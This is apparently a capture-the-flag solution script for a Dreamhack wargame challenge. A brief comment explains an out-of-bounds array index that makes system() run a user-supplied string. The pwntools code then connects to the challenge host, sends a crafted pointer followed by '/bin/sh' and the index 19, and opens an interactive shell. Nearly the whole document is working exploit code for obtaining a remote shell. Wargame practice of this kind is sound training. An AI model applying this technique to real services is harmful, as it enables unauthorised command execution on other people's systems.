'''
name's address => 0x804a0ac

command's address => 0x804a060

idx => integer

system(command[idx]) => command + idx * 4 == name => can execute system(name)

will execute system('bin/sh/')

'''


from pwn import *

p = remote('host1.dreamhack.games', 9311)
context.log_level = 'debug'

name = 0x804a0ac
command = 0x804a060

payload = p32(name + 4)
payload += '/bin/sh'

p.recvuntil("name: ")
p.send(payload)

p.recvuntil("want?: ")
p.sendline("19")

p.interactive()
